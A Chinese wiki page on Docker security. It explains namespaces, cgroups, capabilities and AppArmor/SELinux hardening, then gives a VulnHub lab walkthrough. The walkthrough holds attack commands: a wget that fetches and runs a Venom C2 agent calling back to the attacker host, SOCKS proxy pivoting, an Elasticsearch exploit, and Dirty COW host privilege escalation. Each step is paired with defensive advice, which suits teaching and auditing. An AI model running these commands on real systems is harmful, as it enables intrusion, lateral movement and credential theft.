---
title: Docker 容器安全基础机制详解
description: 系统梳理 Docker 容器安全核心机制，涵盖架构组件、Namespace 隔离、Cgroup 资源限制、Linux Capability
  权限模型及主流加固方案（AppArmor/SELinux 等），并补充 2019-12-16 每日安全看点收录的三篇 Docker 容器安全实战文章作为扩展阅读，新增基于
  VulnHub Social Network 靶机的容器环境识别、内网横向移动、C2 代理通道建立等实战案例，丰富攻击审计视角。
category: ai-security
tags:
- Docker
- 容器安全
- Namespace
- Cgroup
- Linux Capability
- AppArmor
- SELinux
- 安全架构
- 容器逃逸
- 攻击审计
- VulnHub
- 内网渗透
- C2框架
- Venom
date: '2023-04-14'
updated: '2026-11-14'
---

## Docker 架构与核心组件

Docker 采用 **Client/Server (C/S) 架构**。客户端通过命令行或 REST API 向守护进程发送请求，守护进程负责构建、运行和分发容器。客户端与守护进程可运行在同一主机，也可通过 Socket 或远程 API 通信。

Docker 核心组件由三大部分组成：

| 组件 | 职责 |
|------|------|
| **Docker 引擎** | 运行时服务提供者，封装 Namespace、Cgroup、Capability 等底层安全技术 |
| **Docker 容器** | 承载用户业务负载的运行实例，包含应用程序及其依赖 |
| **Docker 仓库** | 集中存储、管理镜像的注册中心，支持公有/私有仓库 |

与传统虚拟化（Hypervisor + Guest OS）相比，Docker 移除了 Hypervisor 与客户操作系统层，直接在宿主内核上通过容器引擎调度，实现秒级启动与高资源利用率，但也因共享内核而引入特有攻击面。

## 核心安全隔离机制

### Namespace 隔离

Namespace 是容器隔离的基石。启动容器时，Docker 为其创建一组独立的 Namespace，使容器内进程对宿主及其他容器的资源不可见。Linux 当前支持六种 Namespace：

| Namespace 类型 | 隔离资源范围 | 系统调用常量 |
|----------------|--------------|--------------|
| **PID** | 进程 ID 编号 | `CLONE_NEWPID` |
| **NET** | 网络设备、协议栈、端口、路由表 | `CLONE_NEWNET` |
| **MNT** | 挂载点、文件系统层级 | `CLONE_NEWNS` |
| **UTS** | 主机名与域名 | `CLONE_NEWUTS` |
| **IPC** | 进程间通信（信号量、消息队列、共享内存） | `CLONE_NEWIPC` |
| **USER** | 用户 ID 与组 ID 映射 | `CLONE_NEWUSER` |

> **注意**：User Namespace 通过 UID/GID 映射可实现“容器内 root ≠ 宿主 root”，是权限降级的关键手段。

### Cgroup 资源限制

Control Groups (Cgroup) 负责**资源审计与限制**，解决多租户场景下的资源公平分配与 DoS 防护。Cgroup 以子系统形式对资源进行管控：

- **cpu / cpuset** — CPU 时间片与核心绑定
- **memory** — 物理内存、Swap 使用上限
- **blkio** — 块设备 I/O 带宽与 IOPS
- **devices** — 设备节点访问白名单
- **pids** — 进程/线程数上限（防止 Fork 炸弹）
- **freezer** — 整组挂起/恢复

通过组合子系统，可精细划定容器资源配额，缩小“资源耗尽型”攻击面。

### Linux Capability 权限模型

传统 Linux 将特权二分为 root 与非 root，Capability 将特权拆解为 **38 个细粒度标志**，实现最小权限原则。Docker 默认采用**白名单机制**，仅授予容器必要 Capability，其余一律剥离。

#### Docker 默认开启的 Capability 列表

| Capability | 说明 |
|------------|------|
| `AUDIT_WRITE` | 向内核审计日志写入记录 |
| `CHOWN` | 任意修改文件 UID/GID |
| `DAC_OVERRIDE` | 绕过文件读写权限检查 (DAC) |
| `FOWNER` | 绕过文件所有者权限检查 |
| `FSETID` | 修改文件时保留 SUID/SGID 位 |
| `KILL` | 向非自身进程发送信号 |
| `MKNOD` | 创建特殊设备文件 `mknod()` |
| `NET_BIND_SERVICE` | 绑定 <1024 端口 |
| `NET_RAW` | 使用 RAW/PACKET 套接字 |
| `SETFCAP` | 设置文件 Capability |
| `SETGID` | 修改进程 GID |
| `SETPCAP` | 转移/删除其他进程 Capability |
| `SETUID` | 修改进程 UID |
| `SYS_CHROOT` | 使用 `chroot()` 与 `setns()` 切换挂载 NS |

> **运行时调整**：`docker run --cap-add=SYS_ADMIN --cap-drop=NET_RAW` 可动态增减 Capability。

### 其他主流加固方案

Docker 仅默认启用 Capability，生产环境建议叠加以下 **强制访问控制 (MAC)** 体系：

| 方案 | 特点 | 典型场景 |
|------|------|----------|
| **AppArmor** | 基于路径的配置文件，上手易，Ubuntu 默认集成 | 限制容器文件读写、网络访问、能力调用 |
| **SELinux** | 基于标签的强制访问控制，策略更细致，Red Hat/CentOS 默认 | 多级安全 (MLS)、多类别安全 (MCS) 场景 |
| **Seccomp** | 系统调用过滤白名单，默认阻塞 `keyctl`、`bpf` 等高危调用 | 防御内核漏洞利用、容器逃逸 |
| **TOMOYO / GRSEC** | 学习模式自动生成策略 / 内核级加固补丁集 | 高安全合规环境 |

> **最佳实践**：`--security-opt apparmor=docker-default --security-opt seccomp=default.json` 叠加使用，实现纵深防御。

## 容器漏洞报告总结

笔者整理了 **2017–2020 年** 与容器相关的 CVE 漏洞报告，汇总地址：  
🔗 <https://github.com/XiaoXiaoGuaiXiaShi/Container-security-papers.git>  

后续分析将以其中典型 CVE 为例，深入剖析容器逃逸、提权及攻击面利用链。

## 扩展阅读：2019-12-16 Docker 容器安全实战系列

以下三篇文章收录于 [[daily-security-digest-20191216]] 每日安全看点，从**攻击与审计实战**视角深入剖析 Docker 容器安全，与本页面的基础机制梳理互为补充，建议配合阅读。

### Docker 容器安全性分析
- **来源**：FreeBuf
- **链接**：<https://www.freebuf.com/articles/system/221319.html>
- **核心看点**：
  - 系统性梳理容器安全威胁模型（镜像、运行时、编排、网络、宿主内核五大攻击面）
  - 深度解析 Namespace 逃逸、Cgroup 逃逸、Capability 滥用、内核漏洞利用四大逃逸路径
  - 实战演示脏牛、waitid、shocker 等经典内核提权漏洞在容器环境下的利用条件与限制
  - 提供基于 AppArmor/SELinux/Seccomp 的纵深加固配置清单

### 攻击和审计 Docker 容器（01）
- **来源**：微信公众号（安全团队专栏）
- **链接**：<https://mp.weixin.qq.com/s/_9vykBJfKA1K6J-ducLKcA>
- **核心看点**：
  - **镜像层审计**：恶意镜像植入、基础镜像篡改、构建时注入（`RUN curl ... | sh` 等供应链攻击）
  - **运行时配置审计**：`--privileged`、`--cap-add=SYS_ADMIN`、宿主挂载（`/var/run/docker.sock`、 `/proc`、 `/sys`）等高危参数检测脚本
  - **网络攻击面**：容器间横向访问、桥接网络嗅探、暴露管理端口（2375/2376）未授权访问
  - 附赠自动化审计工具链（Docker Bench for Security、Clair、Anchore）对比评测

### 攻击和审计 Docker 容器（02）
- **来源**：微信公众号（安全团队专栏）
- **链接**：<https://mp.weixin.qq.com/s/UjSGAUIy1KIXa-hDggaLLw>
- **核心看点**：
  - **容器逃逸实战复现**：
    - `release_agent` + `cgroup` v1 逃逸（写宿主文件系统）
    - `CAP_SYS_ADMIN` + `mount` 挂载宿主根目录
    - `docker.sock` 挂载导致的非根用户提权
    - 内核漏洞（CVE-2019-5736 runc 逃逸、CVE-2020-15257 containerd-shim 逃逸）复现步骤
  - **取证与溯源**：容器日志审计（`docker logs`、`journald`、Falco 运行时监控）、文件系统层差异分析（`docker diff`）、网络流量镜像
  - **红蓝对抗视角**：攻击者视角的“最小权限突破路径”、防御者视角的“检测规则与蜜罐容器部署”

> **阅读建议**：先阅读本页面建立 **Namespace/Cgroup/Capability/MAC** 的底层机制心智模型，再结合上述三篇文章的实战案例，可快速形成“机制→攻击面→利用链→加固/检测”的完整攻防闭环认知。

## 容器逃逸与攻击审计实战案例：VulnHub Social Network 靶机复现

本节基于《Vulnhub靶机 - SOCIAL NETWORK实践》（来源：无名安全团队微信公众号）实战复现，展示从**容器环境识别**、**内网网段发现**、**横向移动**到**利用 C2 框架打通容器至宿主机/内网其他容器代理通道**的完整攻击链，为「攻击审计」视角提供具体战术参考。

### 场景拓扑
- **渗透主机**：192.168.0.114 (Kali)
- **宿主机/网关**：192.168.0.113 (Ubuntu) ⇄ 172.17.0.1 (Docker 网桥)
- **容器 A (Web)**：172.17.0.3 — 暴露 5000 端口映射至宿主 5000，运行 Python Web 服务
- **容器 B (DB)**：172.17.0.2 — 运行 Elasticsearch 9200 端口，存储凭据文件

> 该拓扑体现典型 **「单宿主多容器、桥接网络、管理端口未对外暴露」** 的 Docker 部署模式，攻击面集中在容器间网络可达性与配置不当。

### 容器环境识别（指纹采集）

攻击者在拿到容器 A 的低权限 Shell 后，通过以下三大标志快速确认身处 Docker 容器：

| 检测手段 | 命令/路径 | 判断依据 |
|----------|-----------|----------|
| **Dockerfile 残留** | `cat Dockerfile` | 构建时未清理，直接泄露基础镜像、依赖、启动命令 |
| **/.dockerenv 标记文件** | `ls /.dockerenv` | Docker 运行时自动创建，存在即容器 |
| **/proc/1/cgroup 控制组信息** | `cat /proc/1/cgroup` | PID 1 进程的 cgroup 路径包含 `docker` 字样（如 `/docker/xxxx`） |

> **审计启示**：镜像构建阶段应 `COPY --chown=...` 并 `RUN rm -f Dockerfile`；运行时可通过 `--security-opt="apparmor=..."` 限制对 `/.dockerenv`、`/proc/*/cgroup` 的读取。

### 内网网段发现与横向扫描

确认容器内网段为 `172.17.0.0/16` 后，攻击者使用 Shell 内置循环进行存活探测：

```bash
for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done
```

发现三台存活主机：
- `172.17.0.1` — Docker 网桥网关（即宿主机内网接口）
- `172.17.0.2` — 容器 B (Elasticsearch)
- `172.17.0.3` — 当前容器 A

随后通过 **内网代理** 对 `.1` 与 `.2` 进行端口/服务枚举（见下节）。

> **审计启示**：
> - 启用 `--icc=false` 禁用容器间通信，或使用用户自定义网络 + `--internal` 隔离敏感容器。
> - 宿主机 `docker0` 桥接接口默认允许容器访问宿主服务，建议 `iptables -I DOCKER-USER -s 172.17.0.0/16 -d 172.17.0.1 -j DROP`。

### C2 框架 (Venom) 建立容器→宿主机/内网代理通道

由于 Kali 无法直连 `172.17.0.0/16`，攻击者在容器 A 落地 **Venom Agent**，反连 Kali 监听的 **Venom Admin (7777)**，再在 Admin 侧开启 **SOCKS5 代理 (1080)**，配合 `proxychains` 使 Kali 全工具链获得内网访问能力。

| 角色 | 组件 | 监听/连接 | 关键命令 |
|------|------|-----------|----------|
| **攻击者** | `admin_linux_x64` | `-lport 7777` | `./admin_linux_x64 -lport 7777` |
| **攻击者** | `python3 -m http.server 81` | 传递 Agent | `python3 -m http.server 81` |
| **受害容器 A** | `agent_linux_x64` | `-rhost 192.168.0.114 -rport 7777` | `wget http://192.168.0.114:81/agent_linux_x64 && chmod +x agent_linux_x64 && ./agent_linux_x64 -rhost 192.168.0.114 -rport 7777` |
| **攻击者** | Venom Admin 控制台 | `socks 1080` | `goto 1` → `socks 1080` |
| **攻击者** | `proxychains` | `/etc/proxychains4.conf` → `socks5 127.0.0.1 1080` | `proxychains nmap -Pn -sT 172.17.0.2` |

**代理链路**：
```
Kali (工具) → proxychains (127.0.0.1:1080) → Venom Admin (SOCKS5) → Venom Agent (容器 A) → 容器内网 (172.17.0.0/16)
```

> **审计启示**：
> - 容器出站流量应受 eBPF/Cilium/Calico 策略限制，禁止主动反连外部 C2。
> - 运行时安全工具（Falco、Tracee）可检测 `execve` 落地可执行文件、异常网络连接（如反向 Shell、SOCKS 代理建立）。
> - 审计 `docker exec`、`docker cp` 等管理操作，防止攻击者通过合法管道植入 Agent。

### 内网横向移动：容器 B (Elasticsearch) 利用与凭据窃取

通过代理对 `172.17.0.2:9200` 进行服务识别，发现 **Elasticsearch 旧版本**（存在 RCE），利用公开 Exploit (EDB-36337) 获取容器 B Root Shell，进而读取 `passwords` 文件（MD5 哈希），破解后尝试 `su`/`sudo` 横向复用凭据。

> **审计启示**：
> - 敏感数据（凭据、密钥）严禁明文/弱哈希存储于容器文件系统；应使用 **Docker Secrets / Vault / KMS** 注入。
> - 容器间最小权限网络策略：Web 容器仅需访问 DB 容器特定端口，禁止任意端口探测。

### 宿主机提权：内核漏洞利用 (Dirty COW / CVE-2016-5195 等)

容器 B 为 Ubuntu 3.13.0 内核，攻击者下载本地编译好的 `37292.c` (Dirty COW 变种) 及 `ofs-lib.so`，在 `/tmp` 执行提权，获取宿主机 Root。

> **审计启示**：
> - 宿主机内核必须及时打补丁；生产环境建议启用 **Kernel Live Patching** (Canonical Livepatch, KernelCare)。
> - 容器以非 root 运行、启用 `no-new-privileges`、Seccomp 禁止 `ptrace`/`process_vm_writev` 等提权关键系统调用，可显著提高利用门槛。

### 痕迹隐藏与取证对抗

攻击全程在 `/tmp` 操作，利用 Linux `tmpwatch`/`systemd-tmpfiles` 定期清理特性隐藏工具与日志。

> **审计启示**：
> - 开启 **审计审计框架** 将关键目录 (`/tmp`, `/var/tmp`, `/dev/shm`) 文件创建/执行事件实时推送 SIEM。
> - 容器镜像构建时安装 `auditd`/`sysmon` 等 Agent，或在宿主机部署 **Falco / Tracee / Tetragon** 进行运行时行为基线偏离告警。

---

## 关联页面

- [[daily-security-digest-20191216]] — 2019-12-16 每日安全看点原始归档，含本节引用的三篇 Docker 文章及其他安全资讯
- [[cve-digest-20210420]] — 2021-04-20 漏洞聚合中包含容器安全相关 CVE 补充
- [[frp内网渗透应用]] — 容器环境下内网穿透与横向移动的实战技术参考

## 来源

- [0th3rs安全团队-201911-202204_113](../sources/0th3rs安全团队-201911-202204_113.md)
- 无名安全团队微信公众号：《Vulnhub靶机 - SOCIAL NETWORK实践》
- [0x00实验室-202108-202304_066](../sources/0x00实验室-202108-202304_066.md)
